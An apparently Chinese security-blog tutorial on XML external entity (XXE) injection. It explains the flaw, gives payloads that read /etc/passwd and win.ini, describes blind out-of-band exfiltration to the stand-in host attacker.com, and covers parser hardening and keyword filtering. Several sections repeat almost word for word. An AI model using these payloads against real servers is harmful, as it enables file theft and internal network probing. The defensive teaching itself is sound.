---
title: XXE 外部实体注入：在 XML 里埋一根针
description: 讲清 XXE 的原理与危害，覆盖 DTD 外部实体、SYSTEM 读文件、常见配置路径，以及高级盲注与防御（禁用外部实体、过滤关键字）。
category: security
subcategory: pentest
tags: ['XXE', 'XML', '外部实体', 'Web安全']
pubDate: 2026-07-18
updatedDate: 2026-07-18
order: 11
---

**XXE（XML 外部实体注入）** 是个"低调但致命"的漏洞：当应用解析你提交的 XML，且允许引用**外部实体**时，攻击者就能借 XML 读服务器文件、探测内网，甚至执行命令。它常出现在 API、办公文档（OOXML）、SVG 上传等场景。

> 以下仅在授权靶场（如 XXE-Labs、DVWA）练习；对他人服务器利用 XXE 属违法。

## 原理：XML 里的"实体"能指向外部

XML 支持定义"实体"（类似变量），还能定义"外部实体"——指向一个外部资源：

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>
```

这里 `&xxe;` 会被替换成 `file:///etc/passwd` 的内容。如果服务器解析这段 XML 并把 `<user>` 的值回显，你就看到了 `/etc/passwd`。**问题根源：解析器默认允许加载外部实体。**

## 危害

- **读取本地文件**：`/etc/passwd`、配置文件、源码、密钥；
- **探测内网**：外部实体指向内网地址/端口；
- **SSRF 联动**：本质也是让服务器发请求，可结合内网打服务；
- **拒绝服务（Billion Laughs）**：实体递归展开撑爆内存；
- **执行命令**（少数解析器如 PHP 的 expect 协议）：直接 RCE。

## 利用：从读文件开始

**1. 直接回显型**

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

若响应里出现 passwd 内容，说明存在 XXE。

**2. 常见目标文件**

- Linux：`/etc/passwd`、`/etc/shadow`、`/etc/hosts`；
- 配置文件：`/var/www/config.php`、`WEB-INF/web.xml`；
- Windows：`C:\windows\win.ini`；
- 源码、`.env`、私钥。

**3. 盲 XXE（无回显）**

很多接口不回显 XML 内容，但你可以用"外带（Out-of-Band）"：让外部实体去请求**你控制的服务器**，你那边收到请求就证明 XXE 存在、且能携带数据：

```xml
<!DOCTYPE data [
  <!ENTITY % xxe SYSTEM "http://attacker.com/log?data=">
  %xxe;
]>
```

更精巧的是用"参数实体 + 外部 DTD"把文件内容拼进请求 URL 发出来（OOB 数据外带）。这是盲 XXE 的标准打法。

## 出现场景

- **SOAP / XML-RPC API**：老式接口传 XML；
- **SVG 上传**：SVG 本质是 XML，上传 SVG 时植入外部实体；
- **Office 文档**：docx/xlsx 是 OOXML（zip 包里的 XML），解析时若处理不可信文档；
- **SAML 单点登录**：用 XML 传断言；
- **任何 `Content-Type: application/xml` 的接口**。

所以看到接口收 XML，就要想到 XXE。

## 防御：关掉外部实体

**1. 禁用外部实体（根本）**

各语言解析器默认应关掉 DTD/外部实体：

- PHP：`libxml_disable_entity_loader(true)`（旧）、用 `LIBXML_NONET` 等；
- Java：用更安全的方式建 `DocumentBuilderFactory`，禁用 `DOCTYPE`：
  ```java
  factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
  ```
- Python（lxml）：`resolve_entities=False`、`no_network=True`；
- .NET：`XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit`。

**核心原则：不需要 DTD 就直接禁止 DOCTYPE 声明**，一劳永逸。

**2. 输入过滤**

过滤 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`PUBLIC` 等关键字（辅助，不如禁 DTD 彻底）。

**3. 升级组件**

很多 XXE 是老版本解析库的问题，升级到修复版本。

**4. 不解析不可信 XML**

能不用 XML 就用 JSON；必须收 XML 时，用白名单 schema 校验且禁用外部资源。


## 更多实战案例：从一份"简历上传"看 XXE

假设一个站点允许用户上传 XML 格式的简历，后端用 `simplexml_load_string()` 或 Java 的 `DocumentBuilder` 直接解析，且没关掉外部实体。攻击者上传：

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<resume><name>&xxe;</name></resume>
```

服务端把 `<name>` 里的内容（也就是 `/etc/passwd` 的内容）原样存进数据库或回显，密码文件就泄露了。如果目标在 Windows，可换 `file:///C:/Windows/win.ini`；如果服务出网，还能用 `http://` 实体让服务器主动请求攻击者的服务器，把内网端口扫描结果"外带"出来（这叫 OOB / 带外 XXE）。

## 常见坑

1. **以为只过滤 `<!ENTITY>` 就安全**：攻击者可用参数实体 `<!ENTITY % p SYSTEM "...">` 绕过，过滤要更彻底。
2. **只看回显**：没有回显的"盲 XXE"依然能用 OOB 外带数据，别以为没回显就修好了。
3. **关了外部实体却忘了关 DTD**：有些库要同时禁用 DOCTYPE。
4. **用正则黑名单**：黑名单永远补不全，应走"白名单 + 禁用外部实体"的修复路线。

## 进阶：怎么真正修

PHP 用 `libxml_disable_entity_loader(true)`（老版本）或 `LIBXML_NONET`；Java 给 `DocumentBuilderFactory` 设 `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`；Python 的 `lxml` 设 `resolve_entities=False`。记住一句话：**能不用 XML 解析就别用，要解析就禁止 DTD 和外部实体**。

## 小测验

- 问题1：盲 XXE 没回显怎么利用？答案：用带外（OOB）让服务器请求攻击者服务器外带数据。
- 问题2：修 XXE 首选方案？答案：禁用 DTD / 外部实体，而非正则黑名单。
- 问题3：Windows 下读文件实体路径示例？答案：`file:///C:/Windows/win.ini`。



## 更多实战案例：真实场景里的 XXE 长在哪

XXE 常藏在"接收 XML 的地方"：文件上传（简历、订单、发票的 XML 模板）、API 接口（老系统 SOAP 协议本身就是 XML）、Office 文档（docx/xlsx 本质是 zip 包里的 XML，解析时若处理外部实体就中招）、SVG 图片上传（SVG 是 XML，可内嵌 XXE payload）、以及一切用 `application/xml` 接收数据的接口。测试时，把正常 XML 里的某个字段替换成外部实体引用，看返回是否带回文件内容或报错暴露路径，就能判断是否存在。

## 更多实战案例：盲 XXE 的带外利用细节

没有回显时，构造参数实体让服务器向外发请求：`<!ENTITY % oob SYSTEM "http://attacker.com/log">` 并在 DTD 里 `%oob;` 触发，攻击者服务器收到请求就证明实体被解析了（确认漏洞存在）。进一步把文件内容拼进子域名或路径外带：`http://[data].attacker.com/`，DNS 日志里就能看到读到的内容（需把数据编码成合法域名格式）。这种 OOB 利用是盲 XXE 的标配手法，要求攻击者有公网可记录的服务器。

## 更多实战案例：错误型 XXE

某些解析器在报错时会把实体内容回显到错误信息里。构造一个会引发错误的实体引用（比如引用一个不存在的文件，或把文件内容当 DTD 导致解析失败），错误信息里就可能带着目标文件的部分内容。这比盲 XXE 更直接，但依赖解析器是否回显错误细节。

## 常见坑（补充）

1. **只在上传点找**：API、SVG、Office 文档同样是重灾区。
2. **盲 XXE 没外带服务器就放弃**：可先用"报错型"或"时间型"间接判断。
3. **修复只禁了 SYSTEM**：参数实体 `%` 也能外带，要一并禁 DTD。
4. **忽略依赖库版本**：老版本 XML 库默认不禁用外部实体，升级能直接修。

## 进阶（补充）：如何系统化测试

拿到一个 XML 入口，按"能否回显→能否报错→能否 OOB"三档递进测试；payload 准备内联 DTD、外部 DTD、参数实体三种形态；注意不同语言（PHP/Java/.NET/Python）解析器差异，有的默认安全、有的默认危险。记录哪种 payload 在目标生效，能反推对方用的什么组件。

## 小测验（补充）

- 问题1：除了上传，XXE 还常藏哪？答案：SOAP 接口、SVG 上传、Office 文档、XML API。
- 问题2：盲 XXE 确认存在的最简方法？答案：让服务器请求攻击者服务器（OOB），收到请求即证明。
- 问题3：为什么升级 XML 库能修？答案：新版默认禁用外部实体，从源头消除。



## 更多实战案例：XXE 在 API 与微服务里

现代微服务常通过 XML 交换数据（老 SOAP、某些银行/支付接口、微信支付早期回调）。这些接口接收 `application/xml`，后端用默认不安全的解析器处理，就成了 XXE 温床。测试时把正常 XML 请求体里的某个字段替换成外部实体引用，看返回是否带回文件内容或报错暴露路径。即便前端是 JSON，只要后端接口接受 XML 内容类型，就值得一试。

## 更多实战案例：XXE 与文件上传结合

上传功能若接受 `.xml`、`.svg`、`.docx`、`.xlsx` 等本质是 XML 的文件，后端解析时若处理外部实体，攻击者可构造带 XXE 的 SVG 当头像上传，服务器渲染或处理时触发，读取本地文件或发起请求。SVG 尤其危险，因为它既是 XML 又能被浏览器/图片库解析。

## 常见坑（再补充）

1. **只在上传点找 XXE**：API、SVG、Office 文档同样是重灾区。
2. **盲 XXE 没外带服务器就放弃**：可先用报错型或时间型间接判断。
3. **修复只禁了 SYSTEM**：参数实体 `%` 也能外带，要一并禁 DTD。
4. **忽略依赖库版本**：老版本 XML 库默认不禁用外部实体，升级直接修。

## 进阶（再补充）：系统化测试与修复

拿到 XML 入口，按"能否回显→能否报错→能否 OOB"三档递进；payload 准备内联 DTD、外部 DTD、参数实体三种形态；注意不同语言解析器差异。修复：PHP 用 `libxml_disable_entity_loader`/`LIBXML_NONET`；Java 设 `disallow-doctype-decl`；Python lxml 设 `resolve_entities=False`；原则是不用 XML 解析就别用，要解析就禁 DTD 与外部实体。

## 小测验（再补充）

- 问题1：除了上传，XXE 还常藏哪？答案：SOAP 接口、SVG 上传、Office 文档、XML API。
- 问题2：盲 XXE 确认存在最简方法？答案：让服务器请求攻击者服务器（OOB），收到即证明。
- 问题3：为什么升级 XML 库能修？答案：新版默认禁用外部实体，从源头消除。


## 这一篇你该记住的

XXE 是"XML 解析器允许外部实体"导致的，攻击者在 DTD 里定义 `SYSTEM` 实体读 `/etc/passwd` 或探内网；盲 XXE 用外带（OOB）请求证明并窃取数据。常出现在 XML API、SVG 上传、Office 文档、SAML。防御根本是**禁用 DTD/外部实体**（如 Java 设 disallow-doctype-decl=true），辅以过滤关键字、升级组件、优先用 JSON。

XXE 借的是"解析器的宽松"。下一篇 **反序列化** 借的是"对象重建时的自动触发"——反序列化恶意数据，可能悄悄执行危险代码。
